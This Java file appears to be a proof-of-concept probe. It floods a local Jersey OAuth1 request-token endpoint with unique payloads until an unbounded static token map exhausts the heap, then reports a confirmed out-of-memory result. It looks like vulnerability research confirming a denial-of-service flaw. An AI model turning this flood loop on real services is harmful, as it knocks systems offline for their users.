package org.example.dos.dynamic;

import java.net.URI;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import jakarta.ws.rs.GET;
import jakarta.ws.rs.Consumes;
import jakarta.ws.rs.Path;
import jakarta.ws.rs.POST;
import jakarta.ws.rs.Produces;
import jakarta.ws.rs.QueryParam;
import jakarta.ws.rs.core.MediaType;
import jakarta.ws.rs.core.MultivaluedHashMap;

import org.glassfish.grizzly.http.server.HttpServer;
import org.glassfish.jersey.grizzly2.httpserver.GrizzlyHttpServerFactory;
import org.glassfish.jersey.server.ResourceConfig;
import org.glassfish.jersey.server.oauth1.DefaultOAuth1Provider;

public final class JerseyOAuth1HttpProbe {
    private static final DefaultOAuth1Provider PROVIDER = new DefaultOAuth1Provider();

    @Path("/oauth")
    public static final class OAuthResource {
        @GET
        @Path("/request-token")
        @Produces(MediaType.TEXT_PLAIN)
        public String requestTokenGet() {
            return "ready";
        }

        @POST
        @Path("/request-token")
        @Consumes(MediaType.TEXT_PLAIN)
        @Produces(MediaType.TEXT_PLAIN)
        public String requestToken(@QueryParam("id") int id, String payload) {
            Map<String, List<String>> attributes = new MultivaluedHashMap<>();
            attributes.put("attacker_param_" + id, List.of(payload));
            PROVIDER.newRequestToken("consumer-key", "https://attacker.example/cb/" + id + "/" + payload, attributes);
            return "ok";
        }
    }

    @SuppressWarnings("unchecked")
    private static int mapSize(String fieldName) throws Exception {
        return ((ConcurrentHashMap<?, ?>) ProbeSupport.staticField(DefaultOAuth1Provider.class, fieldName)).size();
    }

    @SuppressWarnings("unchecked")
    private static void clearMap(String fieldName) throws Exception {
        ((ConcurrentHashMap<?, ?>) ProbeSupport.staticField(DefaultOAuth1Provider.class, fieldName)).clear();
    }

    public static void main(String[] args) throws Exception {
        int requests = Integer.parseInt(args[0]);
        int payloadBytes = Integer.parseInt(args[1]);
        int progressEvery = Integer.parseInt(args[2]);
        int port = Integer.parseInt(args[3]);
        String profile = args[4];

        clearMap("consumerByConsumerKey");
        clearMap("requestTokenByTokenString");
        clearMap("accessTokenByTokenString");
        clearMap("verifierByTokenString");
        PROVIDER.registerConsumer("owner", "consumer-key", "consumer-secret", new MultivaluedHashMap<>());
        ProbeSupport.installOomExitHandler(() -> {
            try {
                System.out.println("requestTokenMapSizeBeforeOom=" + mapSize("requestTokenByTokenString"));
            } catch (Exception ignored) {
                System.out.println("requestTokenMapSizeBeforeOom=unknown");
            }
        });

        ResourceConfig config = new ResourceConfig(OAuthResource.class);
        HttpServer server = GrizzlyHttpServerFactory.createHttpServer(
                URI.create("http://127.0.0.1:" + port + "/"), config, false);
        server.start();

        ProbeSupport.printCommon("jersey-oauth1-real-http", requests, payloadBytes, port, profile);
        int i = 0;
        try {
            while (requests < 0 || i < requests) {
                String payload = ProbeSupport.uniquePayload(i, payloadBytes);
                int code = ProbeSupport.http(
                        "POST",
                        "http://127.0.0.1:" + port + "/oauth/request-token?id=" + i,
                        Map.of("Content-Type", MediaType.TEXT_PLAIN),
                        payload.getBytes(java.nio.charset.StandardCharsets.ISO_8859_1));
                if (code >= 500 && ProbeSupport.usedHeapBytes() > Runtime.getRuntime().maxMemory() * 90 / 100) {
                    System.out.println("verdict=CONFIRMED_HEAP_OOM_REAL_HTTP");
                    System.out.println("requestsBeforeOom=" + i);
                    System.out.println("requestTokenMapSizeBeforeOom=" + mapSize("requestTokenByTokenString"));
                    System.out.println("usedHeapBytesAtOom=" + ProbeSupport.usedHeapBytes());
                    System.out.flush();
                    System.exit(ProbeSupport.OOM_EXIT_CODE);
                }
                if (code != 200) {
                    throw new IllegalStateException("unexpected HTTP status " + code);
                }
                i++;
                if (i % progressEvery == 0) {
                    System.out.println("progress requests=" + i
                            + " requestTokenMapSize=" + mapSize("requestTokenByTokenString")
                            + " usedHeapBytes=" + ProbeSupport.usedHeapBytes());
                    System.out.flush();
                }
            }
            System.out.println("verdict=COMPLETED");
            System.out.println("requestsCompleted=" + i);
            System.out.println("requestTokenMapSize=" + mapSize("requestTokenByTokenString"));
        } catch (OutOfMemoryError oom) {
            System.out.println("verdict=CONFIRMED_HEAP_OOM_REAL_HTTP");
            System.out.println("requestsBeforeOom=" + i);
            System.out.println("requestTokenMapSizeBeforeOom=" + mapSize("requestTokenByTokenString"));
            System.out.println("usedHeapBytesAtOom=" + ProbeSupport.usedHeapBytes());
            System.out.flush();
            System.exit(ProbeSupport.OOM_EXIT_CODE);
        } finally {
            server.shutdownNow();
        }
    }
}
